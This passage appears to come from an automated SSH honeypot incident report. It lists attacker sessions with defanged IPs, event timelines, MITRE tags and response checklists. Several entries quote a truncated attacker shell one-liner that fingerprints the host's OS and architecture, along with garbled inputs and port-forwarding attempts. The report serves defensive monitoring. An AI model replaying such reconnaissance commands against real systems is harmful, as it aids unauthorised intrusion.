| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:11:50` | `cowrie.session.connect` |
| `2026-07-17 17:11:51` | `cowrie.login.failed` |
| `2026-07-17 17:11:51` | `cowrie.login.success` |
| `2026-07-17 17:11:52` | `cowrie.session.params` |
| `2026-07-17 17:11:52` | `cowrie.command.input` |
| `2026-07-17 17:11:52` | `cowrie.command.failed` |
| `2026-07-17 17:11:53` | `cowrie.command.input` |
| `2026-07-17 17:11:53` | `cowrie.command.failed` |
| `2026-07-17 17:11:53` | `cowrie.command.input` |
| `2026-07-17 17:11:53` | `cowrie.command.input` |
| `2026-07-17 17:11:53` | `cowrie.command.failed` |
| `2026-07-17 17:11:53` | `cowrie.command.failed` |
| `2026-07-17 17:12:24` | `cowrie.log.closed` |
| `2026-07-17 17:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c82b8d2789

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:12 |
| **Last Seen** | 2026-07-17 17:12 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:12:24` | `cowrie.session.connect` |
| `2026-07-17 17:12:25` | `cowrie.login.success` |
| `2026-07-17 17:12:26` | `cowrie.login.success` |
| `2026-07-17 17:12:26` | `cowrie.session.params` |
| `2026-07-17 17:12:27` | `cowrie.command.input` |
| `2026-07-17 17:12:27` | `cowrie.command.failed` |
| `2026-07-17 17:12:27` | `cowrie.command.input` |
| `2026-07-17 17:12:27` | `cowrie.command.failed` |
| `2026-07-17 17:12:27` | `cowrie.command.input` |
| `2026-07-17 17:12:27` | `cowrie.command.input` |
| `2026-07-17 17:12:27` | `cowrie.command.failed` |
| `2026-07-17 17:12:27` | `cowrie.command.failed` |
| `2026-07-17 17:12:58` | `cowrie.log.closed` |
| `2026-07-17 17:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb382a0ac01

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:12 |
| **Last Seen** | 2026-07-17 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:12:31` | `cowrie.session.connect` |
| `2026-07-17 17:12:31` | `cowrie.client.version` |
| `2026-07-17 17:12:31` | `cowrie.client.kex` |
| `2026-07-17 17:12:31` | `cowrie.login.success` |
| `2026-07-17 17:12:32` | `cowrie.session.params` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.command.success` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.command.input` |
| `2026-07-17 17:12:32` | `cowrie.log.closed` |
| `2026-07-17 17:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1ffdc96be52

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:12 |
| **Last Seen** | 2026-07-17 17:13 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:12:58` | `cowrie.session.connect` |
| `2026-07-17 17:12:59` | `cowrie.login.success` |
| `2026-07-17 17:12:59` | `cowrie.session.params` |
| `2026-07-17 17:13:00` | `cowrie.command.input` |
| `2026-07-17 17:13:00` | `cowrie.command.failed` |
| `2026-07-17 17:13:00` | `cowrie.command.input` |
| `2026-07-17 17:13:00` | `cowrie.command.failed` |
| `2026-07-17 17:13:00` | `cowrie.command.input` |
| `2026-07-17 17:13:00` | `cowrie.command.failed` |
| `2026-07-17 17:13:01` | `cowrie.command.input` |
| `2026-07-17 17:13:01` | `cowrie.command.failed` |
| `2026-07-17 17:13:01` | `cowrie.command.input` |
| `2026-07-17 17:13:01` | `cowrie.command.input` |
| `2026-07-17 17:13:01` | `cowrie.command.failed` |
| `2026-07-17 17:13:01` | `cowrie.command.failed` |
| `2026-07-17 17:13:32` | `cowrie.log.closed` |
| `2026-07-17 17:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade54a6d0822

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:13 |
| **Last Seen** | 2026-07-17 17:14 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:13:32` | `cowrie.session.connect` |
| `2026-07-17 17:13:33` | `cowrie.login.success` |
| `2026-07-17 17:13:33` | `cowrie.session.params` |
| `2026-07-17 17:13:34` | `cowrie.command.input` |
| `2026-07-17 17:13:34` | `cowrie.command.failed` |
| `2026-07-17 17:13:34` | `cowrie.command.input` |
| `2026-07-17 17:13:34` | `cowrie.command.failed` |
| `2026-07-17 17:13:34` | `cowrie.command.input` |
| `2026-07-17 17:13:34` | `cowrie.command.failed` |
| `2026-07-17 17:13:35` | `cowrie.command.input` |
| `2026-07-17 17:13:35` | `cowrie.command.failed` |
| `2026-07-17 17:13:35` | `cowrie.command.input` |
| `2026-07-17 17:13:35` | `cowrie.command.input` |
| `2026-07-17 17:13:35` | `cowrie.command.failed` |
| `2026-07-17 17:13:35` | `cowrie.command.failed` |
| `2026-07-17 17:14:06` | `cowrie.log.closed` |
| `2026-07-17 17:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cb31cfe4e8

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:14 |
| **Last Seen** | 2026-07-17 17:14 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:14:06` | `cowrie.session.connect` |
| `2026-07-17 17:14:07` | `cowrie.login.success` |
| `2026-07-17 17:14:07` | `cowrie.session.params` |
| `2026-07-17 17:14:08` | `cowrie.command.input` |
| `2026-07-17 17:14:08` | `cowrie.command.failed` |
| `2026-07-17 17:14:08` | `cowrie.command.input` |
| `2026-07-17 17:14:08` | `cowrie.command.failed` |
| `2026-07-17 17:14:08` | `cowrie.command.input` |
| `2026-07-17 17:14:08` | `cowrie.command.failed` |
| `2026-07-17 17:14:09` | `cowrie.command.input` |
| `2026-07-17 17:14:09` | `cowrie.command.failed` |
| `2026-07-17 17:14:09` | `cowrie.command.input` |
| `2026-07-17 17:14:09` | `cowrie.command.input` |
| `2026-07-17 17:14:09` | `cowrie.command.failed` |
| `2026-07-17 17:14:09` | `cowrie.command.failed` |
| `2026-07-17 17:14:40` | `cowrie.log.closed` |
| `2026-07-17 17:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b91cc54044a5

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:14 |
| **Last Seen** | 2026-07-17 17:15 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:14:41` | `cowrie.session.connect` |
| `2026-07-17 17:14:42` | `cowrie.login.success` |
| `2026-07-17 17:14:42` | `cowrie.session.params` |
| `2026-07-17 17:14:43` | `cowrie.command.input` |
| `2026-07-17 17:14:43` | `cowrie.command.failed` |
| `2026-07-17 17:14:43` | `cowrie.command.input` |
| `2026-07-17 17:14:43` | `cowrie.command.failed` |
| `2026-07-17 17:14:43` | `cowrie.command.input` |
| `2026-07-17 17:14:43` | `cowrie.command.failed` |
| `2026-07-17 17:14:44` | `cowrie.command.input` |
| `2026-07-17 17:14:44` | `cowrie.command.failed` |
| `2026-07-17 17:14:44` | `cowrie.command.input` |
| `2026-07-17 17:14:44` | `cowrie.command.input` |
| `2026-07-17 17:14:44` | `cowrie.command.failed` |
| `2026-07-17 17:14:44` | `cowrie.command.failed` |
| `2026-07-17 17:15:15` | `cowrie.log.closed` |
| `2026-07-17 17:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3e6c521657

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:15 |
| **Last Seen** | 2026-07-17 17:15 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:15:15` | `cowrie.session.connect` |
| `2026-07-17 17:15:16` | `cowrie.login.success` |
| `2026-07-17 17:15:16` | `cowrie.session.params` |
| `2026-07-17 17:15:17` | `cowrie.command.input` |
| `2026-07-17 17:15:17` | `cowrie.command.failed` |
| `2026-07-17 17:15:17` | `cowrie.command.input` |
| `2026-07-17 17:15:17` | `cowrie.command.failed` |
| `2026-07-17 17:15:17` | `cowrie.command.input` |
| `2026-07-17 17:15:17` | `cowrie.command.failed` |
| `2026-07-17 17:15:17` | `cowrie.command.input` |
| `2026-07-17 17:15:17` | `cowrie.command.failed` |
| `2026-07-17 17:15:18` | `cowrie.command.input` |
| `2026-07-17 17:15:18` | `cowrie.command.input` |
| `2026-07-17 17:15:18` | `cowrie.command.failed` |
| `2026-07-17 17:15:18` | `cowrie.command.failed` |
| `2026-07-17 17:15:49` | `cowrie.log.closed` |
| `2026-07-17 17:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb9bf73a666a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:15 |
| **Last Seen** | 2026-07-17 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:15:40` | `cowrie.session.connect` |
| `2026-07-17 17:15:40` | `cowrie.client.version` |
| `2026-07-17 17:15:40` | `cowrie.client.kex` |
| `2026-07-17 17:15:40` | `cowrie.login.success` |
| `2026-07-17 17:15:41` | `cowrie.session.params` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.command.success` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.command.input` |
| `2026-07-17 17:15:41` | `cowrie.log.closed` |
| `2026-07-17 17:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c258f5c8bcb

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:15 |
| **Last Seen** | 2026-07-17 17:16 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:15:49` | `cowrie.session.connect` |
| `2026-07-17 17:15:50` | `cowrie.login.success` |
| `2026-07-17 17:15:50` | `cowrie.session.params` |
| `2026-07-17 17:15:51` | `cowrie.command.input` |
| `2026-07-17 17:15:51` | `cowrie.command.failed` |
| `2026-07-17 17:15:51` | `cowrie.command.input` |
| `2026-07-17 17:15:51` | `cowrie.command.failed` |
| `2026-07-17 17:15:52` | `cowrie.command.input` |
| `2026-07-17 17:15:52` | `cowrie.command.failed` |
| `2026-07-17 17:15:52` | `cowrie.command.input` |
| `2026-07-17 17:15:52` | `cowrie.command.failed` |
| `2026-07-17 17:15:52` | `cowrie.command.input` |
| `2026-07-17 17:15:52` | `cowrie.command.input` |
| `2026-07-17 17:15:52` | `cowrie.command.failed` |
| `2026-07-17 17:15:52` | `cowrie.command.failed` |
| `2026-07-17 17:16:23` | `cowrie.log.closed` |
| `2026-07-17 17:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca1458550997

| Field | Detail |
|---|---|
| **Source IP** | `83.239.108[.]218` |
| **First Seen** | 2026-07-17 17:16 |
| **Last Seen** | 2026-07-17 17:21 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:16:17` | `cowrie.session.connect` |
| `2026-07-17 17:16:18` | `cowrie.client.version` |
| `2026-07-17 17:16:18` | `cowrie.client.kex` |
| `2026-07-17 17:16:19` | `cowrie.login.success` |
| `2026-07-17 17:16:19` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.108[.]218` to AbuseIPDB if not already reported
- [ ] Block `83.239.108[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a572973590a

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-07-17 17:16 |
| **Last Seen** | 2026-07-17 17:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:16:24` | `cowrie.session.connect` |
| `2026-07-17 17:16:25` | `cowrie.client.version` |
| `2026-07-17 17:16:25` | `cowrie.client.kex` |
| `2026-07-17 17:16:26` | `cowrie.login.success` |
| `2026-07-17 17:16:27` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683ceefda3e0

| Field | Detail |
|---|---|
| **Source IP** | `217.52.226[.]144` |
| **First Seen** | 2026-07-17 17:18 |
| **Last Seen** | 2026-07-17 17:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:18:38` | `cowrie.session.connect` |
| `2026-07-17 17:18:38` | `cowrie.client.version` |
| `2026-07-17 17:18:38` | `cowrie.client.kex` |
| `2026-07-17 17:18:39` | `cowrie.login.success` |
| `2026-07-17 17:18:40` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.52.226[.]144` to AbuseIPDB if not already reported
- [ ] Block `217.52.226[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee4cbfc3434

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 17:24 |
| **Last Seen** | 2026-07-17 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:24:14` | `cowrie.session.connect` |
| `2026-07-17 17:24:14` | `cowrie.client.version` |
| `2026-07-17 17:24:14` | `cowrie.client.kex` |
| `2026-07-17 17:24:14` | `cowrie.login.success` |
| `2026-07-17 17:24:15` | `cowrie.session.params` |
| `2026-07-17 17:24:15` | `cowrie.command.input` |
| `2026-07-17 17:24:15` | `cowrie.log.closed` |
| `2026-07-17 17:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58bc31ffb478

| Field | Detail |
|---|---|
| **Source IP** | `183.167.217[.]86` |
| **First Seen** | 2026-07-17 17:25 |
| **Last Seen** | 2026-07-17 17:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:25:56` | `cowrie.session.connect` |
| `2026-07-17 17:25:57` | `cowrie.client.version` |
| `2026-07-17 17:25:57` | `cowrie.client.kex` |
| `2026-07-17 17:25:59` | `cowrie.login.success` |
| `2026-07-17 17:25:59` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:26:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.217[.]86` to AbuseIPDB if not already reported
- [ ] Block `183.167.217[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca1ec7ef4119

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:27 |
| **Last Seen** | 2026-07-17 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:27:35` | `cowrie.session.connect` |
| `2026-07-17 17:27:35` | `cowrie.client.version` |
| `2026-07-17 17:27:35` | `cowrie.client.kex` |
| `2026-07-17 17:27:35` | `cowrie.login.success` |
| `2026-07-17 17:27:36` | `cowrie.session.params` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.command.success` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.command.input` |
| `2026-07-17 17:27:36` | `cowrie.log.closed` |
| `2026-07-17 17:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a4f128850c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:29 |
| **Last Seen** | 2026-07-17 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:29:49` | `cowrie.session.connect` |
| `2026-07-17 17:29:49` | `cowrie.client.version` |
| `2026-07-17 17:29:49` | `cowrie.client.kex` |
| `2026-07-17 17:29:49` | `cowrie.login.success` |
| `2026-07-17 17:29:50` | `cowrie.session.params` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.command.success` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.command.input` |
| `2026-07-17 17:29:50` | `cowrie.log.closed` |
| `2026-07-17 17:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42196c2b154c

| Field | Detail |
|---|---|
| **Source IP** | `82.193.122[.]91` |
| **First Seen** | 2026-07-17 17:34 |
| **Last Seen** | 2026-07-17 17:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:34:05` | `cowrie.session.connect` |
| `2026-07-17 17:34:05` | `cowrie.client.version` |
| `2026-07-17 17:34:05` | `cowrie.client.kex` |
| `2026-07-17 17:34:06` | `cowrie.login.success` |
| `2026-07-17 17:34:06` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.193.122[.]91` to AbuseIPDB if not already reported
- [ ] Block `82.193.122[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
